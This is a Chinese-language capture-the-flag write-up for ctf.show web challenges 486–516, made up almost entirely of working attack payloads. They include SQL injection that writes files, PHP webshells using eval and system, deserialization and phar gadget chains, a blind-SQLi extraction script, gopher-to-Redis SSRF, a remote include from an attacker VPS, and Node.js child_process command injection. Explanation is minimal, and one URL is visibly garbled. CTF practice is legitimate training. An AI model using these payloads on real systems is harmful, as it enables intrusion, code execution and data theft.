#  前言

这篇wp主要以引导为主，拒绝无脑抄

# web486

简简单单目录穿越

http://81db964b-a4d8-42eb-bc64-b31e47af7fde.chall.ctf.show:8080/index.php?action=../flag

# web487

首页adction能够读取代码，我读完了所有代码发现只有http://81db964b-a4d8-42eb-bc64-b31e47af7fde.chall.ctf.show:8080/index.php?action=../index里面代码游泳

```
    $username=$_GET['username'];
    $password=$_GET['password'];
    $sql = "select id from users where username = md5('$username') and password=md5('$password') order by id limit 1";
    echo $sql;
    $user=db::select_one($sql);
    var_dump($user);
```

直接sql注入，因为web目录没有写入权限所以只能写tmp目录下读取

http://81db964b-a4d8-42eb-bc64-b31e47af7fde.chall.ctf.show:8080/index.php?action=../../../../../../../tmp/y11

http://81db964b-a4d8-42eb-bc64-b31e47af7fde.chall.ctf.show:8080/index.php?action=check&username=123') union select flag from flag into dumpfile "/tmp/y11.php"--+&password=123

# web488

先`?action=check&username=<?php eval($_POST[1]);?>&password=1`

再访问`/cache/cb5e100e5a9a3e7f6d1fd97512215282.php`

具体原因不说自己研究

# web489

和488基本上一样存在变量覆盖，因此可以自定义执行sql语句，实现任意登陆，再覆盖username为`<?php eval($_POST[1]);?>`

最后访问`/cache/6a992d5529f459a44fee58c733255e86.php`即可

# web490

第一步

```php
http://1e6526fd-3805-4ddd-bfca-5ba269c93212.chall.ctf.show:8080/index.php?action=clear
```

第二步

```php
http://1e6526fd-3805-4ddd-bfca-5ba269c93212.chall.ctf.show:8080/index.php?action=check&username=0' union select "`cat /flag`"--+
```

第三步：

```php
http://1e6526fd-3805-4ddd-bfca-5ba269c93212.chall.ctf.show:8080/cache/6a992d5529f459a44fee58c733255e86.php
```



# web491

第一步

```
http://1e6526fd-3805-4ddd-bfca-5ba269c93212.chall.ctf.show:8080/index.php?action=clear
```

第二步

```
http://389af0f6-12b5-448f-8e75-8e3c5c172cd4.chall.ctf.show:8080/index.php?action=check&username=1' union select load_file("/flag") into dumpfile "/tmp/4.php"--+&password=1
```

第三步

```
http://389af0f6-12b5-448f-8e75-8e3c5c172cd4.chall.ctf.show:8080/index.php?action=../../../../../../../../tmp/4
```

# web492

第一步：

```
http://7f02a14b-b18d-4f1b-8e8e-8d23955ff6cd.challenge.ctf.show:8080/index.php?action=check&username=;'123&user[username]=--><?php system("cat /flag");?><!--
```

第二步

```
http://7f02a14b-b18d-4f1b-8e8e-8d23955ff6cd.challenge.ctf.show:8080/cache/7f02a14b-b18d-4f1b-8e8e-8d23955ff6cd.challenge.ctf.show:8080/cache/6a992d5529f459a44fee58c733255e86.php
```

# web493

通过读文件发现考点是反序列化，构造

```php
<?php
class db{
    
    public $log;
    public $sql;
    public function __construct(){
        $this->log=new dbLog();
    }

    public function __destruct(){
        $this->log->log($this->sql);
    }
}
class dbLog{
    public $sql;
    public $content;
    public $log;

    public function __construct(){
        $this->log='log/1.php';
        $this->content = "<?php system('cat /flag');?>";
    }

}
$a = new db();
echo urlencode(serialize($a));
```

# web494

有点骚，和上一题一模一样不过在数据库里，没啥难度自己做

# web495

```
username=1' union select "1",group_concat(flagisherebutyouneverknow) from flagyoudontknow%23
```



# web496

```
import requests
import random
url = "http://6a42440e-0d5b-4a37-a3ec-3d237cf94f0f.challenge.ctf.show:8080/api/admin_edit.php"
i = 0
result = ""
while 1:
    i = i + 1
    head = 32
    tail = 127
    while head < tail:
        mid = (head + tail) >> 1
        user = "".join(random.sample('qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890', 6))
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # flagisherebutyouneverknow118 之后去http://6a42440e-0d5b-4a37-a3ec-3d237cf94f0f.challenge.ctf.show:8080/index.php?action=index
        # post数据username=1' union select "1",group_concat(flagisherebutyouneverknow118) from flagyoudontknow76%23%23&password=1'即可
        payload = "select group_concat(column_name) from information_schema.columns where table_name='flagyoudontknow76'"
        data = {
            "nickname": f"{user}",
            "user[username]": f"21232f297a57a5a743894a0e4a801fc3' and (select ascii(substr(({payload}),{i},1)))>{mid}#"
        }
        headers = {
            "cookie": "__cfduid=d995c7d9f402d7ee1e5573ecba5351ba71615771126; PHPSESSID=3ld0fehhsdfue824lco65i0k97"
        }
        r = requests.post(url, data=data, headers=headers)
        if "成功" in r.json()['msg']:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


```

# web497

第一步：

```
http://68fa2d97-f636-4bc8-896d-7b3924312c21.challenge.ctf.show:8080/index.php?action=check

username=1' union select group_concat(username),group_concat(nickname),group_concat(avatar) from user%23
```

第二步：修改头像

```
file:///flag
```

# web498

gopher协议打redis最后执行，百度搜索gopherus的使用

1=system("cat /flag_bei_ni_fa_xian_le");



# web499

第一步

```
http://68fa2d97-f636-4bc8-896d-7b3924312c21.challenge.ctf.show:8080/index.php?action=check

username=1' union select group_concat(username),group_concat(nickname),group_concat(avatar) from user%23
```

第二步：

```
http://3a8e6454-e285-4137-95be-52a9377d49a8.challenge.ctf.show:8080/index.php?action=view&page=admin_settings
修改任意一项为<?php system($_GET[1]);?>
```

第三步：

```
http://3a8e6454-e285-4137-95be-52a9377d49a8.challenge.ctf.show:8080/config/settings.php?1=cat%20%20/flag_bei_ni_fa_xian_le
```

# web500

首先老规矩登录

```
http://d637394f-6b04-420b-9152-c25ea72db54a.challenge.ctf.show:8080/index.php?action=check

username=1' union select group_concat(username),group_concat(nickname),group_concat(avatar) from user%23
```

多了个数据库备份功能，看到备份能想到的 要么是目录穿越读任意文件 要么就是后缀可控 能改个参数实现phpshell

刚好审计个人配置信息那里，发现个人头像的地址参数是不限制长度插入数据库的因此插入

头像地址改为

```
<?php system($_GET[1]);?>
```

之后访问

```
http://d637394f-6b04-420b-9152-c25ea72db54a.challenge.ctf.show:8080/index.php?action=view&page=admin_db_backup
```

点击备份，把名字改为1.php

最后

```
http://d637394f-6b04-420b-9152-c25ea72db54a.challenge.ctf.show:8080/backup/1.php?1=cat%20/flag_bei_ni_fa_xian_le
```

# web501

首先老规矩登录

```
http://d637394f-6b04-420b-9152-c25ea72db54a.challenge.ctf.show:8080/index.php?action=check

username=1' union select group_concat(username),group_concat(nickname),group_concat(avatar) from user%23
```

admin_db_backup页面

```
	if(preg_match('/^zip|tar|sql$/', $db_format)){
```

和上一题一样只需要格式为1.zip.php即可

# web502

首先老规矩登录

```
http://d637394f-6b04-420b-9152-c25ea72db54a.challenge.ctf.show:8080/index.php?action=check

username=1' union select username,nickname,avatar from user%23
```



利用了shell_exec的一个小特性绕过

```
http://55b7e745-7140-4c7f-8065-00f0116137bf.challenge.ctf.show:8080/api/admin_db_backup.php
db_format=zip&pre=/var/www/html/cache/3.php;
```

```
http://55b7e745-7140-4c7f-8065-00f0116137bf.challenge.ctf.show:8080/cache/3.php?1=cat%20/flag_bei_ni_fa_xian_le
```



# web503

在admin_upload.php存在文件上传，因为只能上传php，结合admin_db_backup.php有个file_exists得到应该是phar反序列化

```
<?php
class db{
    
    public $log;
    public $sql;
    public function __construct(){
        $this->log=new dbLog();
        $this->sql = "<?php system($_GET[1]);?>"
    }

    public function __destruct(){
        $this->log->log($this->sql);
    }
}
class dbLog{
    public $sql;
    public $content;
    public $log;

    public function __construct(){
        $this->log='log/1.php';
    }

}
$a = new db();
$phar=new Phar("1.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt","test");
$phar->stopBuffering();
```

#  web504

```
覆盖
../../../../../../../../../../../../../../var/www/html/config/settings
内容为
O:2:"db":8:{s:2:"db";N;s:3:"log";O:5:"dbLog":3:{s:3:"sql";N;s:7:"content";N;s:3:"log";s:9:"log/1.php";}s:3:"sql";s:25:"<?php system($_GET[1]);?>";s:8:"username";s:4:"root";s:8:"password";s:4:"root";s:4:"port";s:4:"3306";s:4:"addr";s:9:"127.0.0.1";s:8:"database";s:7:"ctfshow";}

之后访问url/log/1.php?1=cat /flag_bei_ni_fa_xian_le
```



# web505

```
上传new.sml内容user<?php system($_GET[1]);?>

http://8184adbc-44af-4034-ae26-48946d374def.challenge.ctf.show:8080/api/admin_file_view.php?1=cat /flag_is_here_aabbcc
post
f=/var/www/html/templates/new.sml&debug=1
```

# web506

```
上传new.yy内容user<?php system($_GET[1]);?>

http://8184adbc-44af-4034-ae26-48946d374def.challenge.ctf.show:8080/api/admin_file_view.php?1=cat /flag_is_here_aabbcc
post
f=/var/www/html/templates/new.yy&debug=1
```



# web507

```
http://6714dbd4-2c22-493e-827c-fd1872aefe06.challenge.ctf.show:8080/api/admin_file_view.php
post
debug=1&f=data://test/palin,user<?php+system("cat /flag_is_here_dota");
```

# web508

```
http://74efad91-d13e-4da9-8c92-b94a44a08c2c.challenge.ctf.show:8080/api/admin_file_view.php?1=cat /flag_is_here_dota2
post数据
debug=1&f=../../../../../../../../../../../var/www/html/img/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
```

# web509

```
在系统配置的文件上传处，上传图片，内容为user<?=`$_GET[1]`;
之后访问http://b48fa450-ca3e-4fb8-a5f5-53f32d9c5a0c.challenge.ctf.show:8080/api/admin_file_view.php?1=cat /flag_is_here_lol
post数据
debug=1&f=../../../../../../../../var/www/html/img/f3ccdd27d2000e3f9255a7e3e2c48800.jpg

```

# web510

```
刚好比较巧妙的是session目录开头就是user
第一步登陆，然后去个人资料设置那里修改头像内容为<?php system($_GET[1]);?>，因为avator属性不限制长度
第二步http://051847d1-1347-4670-b312-6df487623d9a.challenge.ctf.show:8080/api/admin_file_view.php?1=cat /f*
post数据，sess_后面的那串是你在cookie当中phpseesid的值
debug=1&f=../../../../../../../../../../tmp/sess_6kl7kq5mtlhj06sovlohpmmij7

```

# web511

上传new.sml

```
123{{var:nickname}}
```

然后去个人资料修改显示昵称为`cat /f*`

之后访问`http://c38a2bd3-a49b-4b93-af9b-1e64f5ba944c.challenge.ctf.show:8080/index.php?action=view&page=new`

# web512



# web513

第一步，在新增模板处，新建两个模板

第一个为new.sml，内容为

```
http://your-vps/1.txt
```

在你的vps的1.txt中输入内容`<?=`cat /f*`;`

第二个为new5.sml，内容为

```
123{{cnzz}}
```

第二步，在系统配置处的页面统计处填写

```
/var/www/html/templates/new.sml
```

之后访问得到flag

```
http://a878d84d-51c0-4e64-866b-58b80096d5e5.challenge.ctf.show:8080/index.php?action=view&page=new5
```

# web515

利用反引号与字符拼接

```
http://c6e0801d-412e-4363-bbb1-153227a88b4c.challenge.ctf.show:8080/signup
username=3&password=1)%2beval(eval(`ctxx.re`%2B`quest.qu`%2b`ery.z`)
http://c6e0801d-412e-4363-bbb1-153227a88b4c.challenge.ctf.show:8080/user/10?z=process.mainModule.require("child_process").execSync("echo $FLAG").toString()

```

# web516

利用反引号

```
http://c6e0801d-412e-4363-bbb1-153227a88b4c.challenge.ctf.show:8080/signup
username=3&password=1)%2beval((`pro`%2b`cess`%2b`.mainModule`%2b`.req`%2b`uire("child_pro`%2b`cess").exe`%2b`cSync("echo $FLAG").toString()`)
http://c6e0801d-412e-4363-bbb1-153227a88b4c.challenge.ctf.show:8080/user/10
```

